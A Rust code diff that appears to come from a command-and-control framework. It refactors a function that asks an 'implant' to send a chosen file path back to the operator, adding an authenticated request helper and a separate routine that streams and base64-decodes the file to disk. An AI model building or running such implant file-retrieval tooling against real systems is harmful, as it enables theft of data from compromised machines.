@@ -1,32 +1,46 @@
 use base64::{engine::general_purpose::STANDARD, Engine as _};
 use futures::StreamExt;
 use rand::Rng;
-use reqwest::Client;
+use reqwest::Response;
 use std::{error::Error, fs::File, io::Write, path::Path, time::Duration};
 use tokio::time::sleep;
 use uuid::Uuid;
+
+use crate::utils::request::send_authenticated_request;
 
 pub async fn receive_file(
     implant_id: Uuid,
     file_path: &str,
     save_path: &Path,
-    file_url: &str,
+    download_url: &str,
 ) -> Result<(), Box<dyn Error>> {
-    let client = Client::new();
-    let mut file = File::create(save_path)?;
+    let content_json = &serde_json::json!({
+        "uuid": implant_id,
+        "file_path": file_path
+    });
 
-    let response = client
-        .post(file_url)
-        .json(&serde_json::json!({
-            "uuid": implant_id,
-            "file_path": file_path
-        }))
-        .send()
-        .await?;
+    let response = send_authenticated_request("post", download_url, content_json).await;
 
-    if !response.status().is_success() {
-        return Err(format!("Failed to request file: {}", response.status()).into());
+    match response {
+        Ok(res) => {
+            if res.status().is_success() {
+                receive_file_stream(res, save_path)
+                    .await
+                    .expect("Failed to receive file stream");
+            } else {
+                return Err(format!("Failed to request file: {}", res.status()).into());
+            }
+        }
+        Err(e) => {
+            eprintln!("Error response from server: {}", e);
+        }
     }
+    println!("Successfully received file: {}", file_path);
+    Ok(())
+}
+
+async fn receive_file_stream(response: Response, save_path: &Path) -> Result<(), Box<dyn Error>> {
+    let mut file = File::create(save_path)?;
 
     let mut stream = response.bytes_stream();
     let mut buffer = String::new();
@@ -93,7 +107,5 @@ pub async fn receive_file(
         file.write_all(&decoded_chunk)
             .map_err(|e| format!("Failed to write remaining chunk to file: {}", e))?;
     }
-
-    println!("Successfully received file: {}", file_path);
     Ok(())
 }
